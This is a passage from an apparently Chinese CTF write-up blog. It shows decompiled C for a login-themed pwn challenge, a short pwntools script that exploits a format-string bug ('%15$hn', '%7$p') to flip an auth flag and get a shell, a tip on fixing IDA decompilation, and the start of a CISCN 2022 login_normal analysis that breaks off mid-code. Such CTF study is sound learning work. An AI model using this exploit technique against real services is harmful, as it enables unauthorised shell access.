[esp-DEh] [ebp-12Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-DAh] [ebp-128h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp-D6h] [ebp-124h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-D2h] [ebp-120h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp-CEh] [ebp-11Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp-CAh] [ebp-118h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp-C6h] [ebp-114h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp-C2h] [ebp-110h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp-BEh] [ebp-10Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp-BAh] [ebp-108h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-B6h] [ebp-104h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp-B2h] [ebp-100h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp-A6h] [ebp-F4h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp-A2h] [ebp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp-9Ah] [ebp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp-96h] [ebp-E4h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp-92h] [ebp-E0h]</span></span><br><span class="line">  _DWORD v23[<span class="number">35</span>]; <span class="comment">// [esp-8Eh] [ebp-DCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [esp-2h] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> buf; <span class="comment">// [esp+2h] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [esp+6h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [esp+Ah] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Eh] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">16</span>]; <span class="comment">// [esp+12h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">16</span>]; <span class="comment">// [esp+22h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">16</span>]; <span class="comment">// [esp+32h] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// [esp+42h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v32 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  dword_804C044 = <span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  buf %= <span class="number">0xF4240</span>u;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciallo~(∠・ω&lt; )⌒☆, What is your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%15s&quot;</span>, format, v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;,PLAY Genshin Impact?(y or n)&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;v24 + <span class="number">3</span>, <span class="number">1u</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(v24) == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;goodbye&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(fd, &amp;v26, <span class="number">4u</span>);</span><br><span class="line">    read(fd, s2, <span class="number">0xF</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter your account and password&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Account:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(</span><br><span class="line">      <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">      &amp;v27,</span><br><span class="line">      v18,</span><br><span class="line">      v19,</span><br><span class="line">      v23,</span><br><span class="line">      v20,</span><br><span class="line">      v21,</span><br><span class="line">      v22,</span><br><span class="line">      v23[<span class="number">0</span>],</span><br><span class="line">      v23[<span class="number">1</span>],</span><br><span class="line">      v23[<span class="number">2</span>],</span><br><span class="line">      v23[<span class="number">3</span>],</span><br><span class="line">      v23[<span class="number">4</span>],</span><br><span class="line">      v23[<span class="number">5</span>],</span><br><span class="line">      v23[<span class="number">6</span>],</span><br><span class="line">      v23[<span class="number">7</span>],</span><br><span class="line">      v23[<span class="number">8</span>],</span><br><span class="line">      v23[<span class="number">9</span>],</span><br><span class="line">      v23[<span class="number">10</span>],</span><br><span class="line">      v23[<span class="number">11</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(</span><br><span class="line">      <span class="string">&quot;%15s&quot;</span>,</span><br><span class="line">      s1,</span><br><span class="line">      v23[<span class="number">14</span>],</span><br><span class="line">      v23[<span class="number">15</span>],</span><br><span class="line">      v23[<span class="number">16</span>],</span><br><span class="line">      v23[<span class="number">17</span>],</span><br><span class="line">      v23[<span class="number">18</span>],</span><br><span class="line">      v23[<span class="number">19</span>],</span><br><span class="line">      v23[<span class="number">20</span>],</span><br><span class="line">      v23[<span class="number">21</span>],</span><br><span class="line">      v23[<span class="number">22</span>],</span><br><span class="line">      v23[<span class="number">23</span>],</span><br><span class="line">      v23[<span class="number">24</span>],</span><br><span class="line">      v23[<span class="number">25</span>],</span><br><span class="line">      v23[<span class="number">26</span>],</span><br><span class="line">      v23[<span class="number">27</span>],</span><br><span class="line">      v23[<span class="number">28</span>],</span><br><span class="line">      v23[<span class="number">29</span>],</span><br><span class="line">      v23[<span class="number">30</span>],</span><br><span class="line">      v23[<span class="number">31</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v27 == v26 &amp;&amp; !<span class="built_in">strcmp</span>(s1, s2) )        <span class="comment">// v26是随机数</span></span><br><span class="line">      dword_804C044 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_804C044 )                        <span class="comment">// 直接改这个为1</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Login is risky. The verification code has been sent to 151xxxx1916&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please enter the verification code:&quot;</span>);</span><br><span class="line">      ((<span class="type">void</span> (__stdcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">int</span> *, _DWORD, <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">int</span>))__isoc99_scanf)(</span><br><span class="line">        <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">        &amp;v27,</span><br><span class="line">        v23[<span class="number">34</span>],</span><br><span class="line">        v24,</span><br><span class="line">        buf,</span><br><span class="line">        v26);</span><br><span class="line">      <span class="keyword">if</span> ( v27 == buf )                         <span class="comment">// buf是随机数</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Genshin Impact, start!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);                      <span class="comment">// getshell</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;verification code error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Account or password error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v32 != __readgsdword(<span class="number">0x14</span>u) )</span><br><span class="line">    sub_80494D0();</span><br><span class="line">  JUMPOUT(<span class="number">0x80494C5</span>);                           <span class="comment">// ret</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逆向并不难</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./start2&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./start2&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28161)</span></span><br><span class="line"><span class="comment"># def debug():</span></span><br><span class="line"><span class="comment">#     gdb.attach(p)</span></span><br><span class="line"><span class="comment">#     pause()</span></span><br><span class="line"></span><br><span class="line">pal=p32(<span class="number">0x0804C044</span>)+<span class="string">b&#x27;%15$hn&#x27;</span>+<span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What is your name?\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">data=p.recvuntil(<span class="string">b&quot;,P&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">5</span>:]</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;LAY Genshin Impact?(y or n)\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter your account and password\n&#x27;</span>,<span class="string">b&#x27;1\na&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter the verification code:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">int</span>(data,<span class="number">16</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这样就打通了。。&#x2F;&#x2F;</p>
<h3 id="如何解决ida7-7反编译不了"><a href="#如何解决ida7-7反编译不了" class="headerlink" title="如何解决ida7.7反编译不了"></a>如何解决ida7.7反编译不了</h3><p>之后去问了菜哥，他的8.3ida是反编译得了的，然后提示信息是<code>0x80493A9</code>上栈帧出了问题，而我们undefine掉ret会发现scanf的参数十分的多，这就是问题所在了（以前一直以为是常态），因此到scanf点击y，将参数改成两个就可以成功反编译了<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115401.png" alt="image-20240514185748987"></p>
<p>这样就可以成功了<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115402.png" alt="image-20240514185809655"></p>
<p>可以看到成功的代码就是如此的赏心悦目</p>
<h1 id="CISCN-2022-初赛-login-normal"><a href="#CISCN-2022-初赛-login-normal" class="headerlink" title="[CISCN 2022 初赛]login_normal"></a>[CISCN 2022 初赛]login_normal</h1><p>本题的漏洞点不难，只是逆向要花点时间</p>
<h2 id="静态分析-3"><a href="#静态分析-3" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    sub_FFD(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是读点数据，然后传参</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_FFD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *ptr2; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*ptr || *ptr != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*ptr != <span class="string">&#x27;\r&#x27;</span> || ptr[<span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// 找到：之后的数据</span></span><br><span class="line">      *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    ptr = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">      *ptr++ = <span class="number">0</span>;</span><br><span class="line">    ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  *ptr = <span class="number">0</span>;</span><br><span class="line">  sa = (<span class="type">char</span> *)(ptr + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="number">10</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      sub_DA8(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      sub_CBD(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一串代码看着让人怀疑人生，因此分段分析，主要分为3部分，1：初始化，2：判断字符串格式并将相应位置的值传进去，3：便是switch，功能函数</p>
<h3 id="判断字符串格式"><a href="#判断字符串格式" class="headerlink" title="判断字符串格式"></a>判断字符串格式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( !*ptr || *ptr != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*ptr != <span class="string">&#x27;\r&#x27;</span> || ptr[<span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">        qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// 找到：之后的数据</span></span><br><span class="line">        *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">        qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    ptr = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">        *ptr++ = <span class="number">0</span>;</span><br><span class="line">    ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v9 = <span 